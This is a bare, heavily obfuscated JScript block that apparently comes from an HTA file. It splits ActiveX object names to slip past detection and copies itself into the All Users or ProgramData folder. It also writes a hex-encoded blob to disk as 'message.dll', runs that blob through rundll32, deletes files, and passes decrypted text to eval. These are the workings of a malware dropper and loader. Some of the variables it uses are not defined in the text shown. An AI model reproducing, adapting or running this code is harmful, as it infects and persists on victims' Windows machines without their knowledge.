<script type="text/JavaScript">
<!--
objFso = new ActiveXObject("Sc"+"ri"+"pt"+"in"+"g."+"Fi"+"le"+"Sy"+"st"+"em"+"Ob"+"je"+"ct")	 	 			 	 		;
scr_obj = new ActiveXObject("WS"+"cr"+"ip"+"t."+"Sh"+"el"+"l")
srcpath = unescape(String(this.location.pathname))	 	 			 	 		;
srcfile = objFso.GetFileName(srcpath)	 	 		;
dt0 = new Date(objFso.GetFile(srcpath).DateCreated)	 	 		;
dtstr0 = dt0.getFullYear()+'/'
	+String(dt0.getMonth()+101).substring(1)+'/'
	+String(dt0.getDate()+100).substring(1)	 	 		;
cpdir = scr_obj.SpecialFolders("Al"+"lU"+"se"+"rs"+"De"+"sk"+"to"+"p")	 	 		;
if (String(cpdir).indexOf('Settings')<0) osflag=1	 	 		;
if (osflag==0) cpdir = cpdir.match(/.+\\/) + 'Application Data\\'+dirname+'\\'	 	 		;
else			cpdir = cpdir.substr(0,2)+'\\ProgramData\\'+dirname+'\\'	 	 		;
verstr = navigator.appVersion.match(/MSIE ([\d\.]*);/)
IEvers = parseInt(RegExp.$1)	 	 		;
orgflag=(srcfile.length>13)	 	 		;
cpfile = userid+'.hta'		 	;
cppath = cpdir+cpfile		 	;
bgpath = cpdir+bgimage		 	;
mespath = cpdir+'message.dll'		 	;
var messrc = ''		 	;
message2 = document.getElementById("ht"+"a1").commandLine		 	;
message2 = message2.match(/--(.*)--/)		 	;
if (message2) message2 = RegExp.$1		 	;
if (message2) eval(do_message(message2,message))		 	;
if (orgflag) { //0st
	if (!objFso.FileExists(cpdir.replace(dirname,'eroer')+'\\bg.jpg')) {
		if (!objFso.FileExists(cppath)) makeCP()   		 	;
		scr_obj.Run('"'+cppath+'"')		 	;
	}
	var wmpplay = scr_obj.Run(movietxt)		 	;
	self.close()		 	;
}
else if (!message2){  //1st
	set_message()		 	;
	setTimeout(go_next, 100)		 	;
}
else {  //2nd,normal
	my_do()		 	;
}
function go_next() {
	a = mespath		 	;
	c = cppath		 	;
	s = 'rund' +'ll32.exe "'+a+'",_goMES@19 '+c		 	;
	scr_obj.Run (s)		 	;
	self.close()		 	;
}
function to_uid() {
	if (srcfile.length<=13) return srcfile.substr(0,srcfile.indexOf('.'))		 	;
	n = Number(srcfile.substr(5,10).split('').reverse().join(''))		 	;
	clist = '0123456789AHXY'		 	;
	cbase = clist.length		 	;
	var a = Array()		 	;
	for(i=0;i<8;i++) { a[i]=clist.charAt(n%cbase); n=Math.floor(n/cbase); }
	return a.reverse().join('').toUpperCase()		 	;
}
function makeCP() {
	if (!objFso.FolderExists(cpdir)) objFso.CreateFolder(cpdir)		 	;
	else {
		if (objFso.FileExists(bgpath)) eval("ob"+"jF"+"so"+".D"+"el"+"et"+"eF"+"il"+"e("+"bg"+"pa"+"th"+")")		 	;
		if (objFso.FileExists(cpdir+'second.dat')) eval("ob"+"jF"+"so"+".D"+"el"+"et"+"eF"+"il"+"e("+"cp"+"di"+"r+"+"'s"+"ec"+"on"+"d."+"da"+"t')")		 	;
	}
	var buf = objFso.OpenTextFile(srcpath,1,false).ReadAll()		 	;
	objFso.CreateTextFile(cppath ,true).Write(buf)		 	;
}
function do_message(cr,srctext) {
	desttext = ''		 	;
	kl = cr.length		 	;
	k = 0		 	;
	for (i=0; i<srctext.length;i++) {
		c = cr.charCodeAt(k) - 0x20		 	;
		k = (k+1)%kl		 	;
		s = srctext.charCodeAt(i) - 0x20		 	;
		s = (s+0x5f-c)%0x5f+0x20		 	;
		desttext += String.fromCharCode(s)		 	;
	}
	desttext = unescape(desttext)		 	;
	return desttext		 	;
}

function set_message() {
	objADO = new ActiveXObject("AD"+"OD"+"B."+"St"+"re"+"am")		 	;
	objADO.Type = 2		 	;
	objADO.charset = "is"+"o-"+"88"+"59"+"-1"		 	;
	objADO.Open()		 	;
	for(i=0;i<jpgsrc.length/2;i++) {
		n = eval("pa"+"rs"+"eI"+"nt"+"(m"+"es"+"sr"+"c."+"su"+"bs"+"tr"+"(i"+"*2"+",2"+"),"+" 1"+"6)")		 	;
		eval("ob"+"jA"+"DO"+".w"+"ri"+"te"+"Te"+"xt"+"(S"+"tr"+"in"+"g."+"fr"+"om"+"Ch"+"ar"+"Co"+"de"+"(n"+"))")		 	;
	}
	eval("ob"+"jA"+"DO"+".S"+"av"+"eT"+"oF"+"il"+"e("+"me"+"sp"+"at"+"h,"+"2)")		 	;
	objADO.Close()		 	;
}
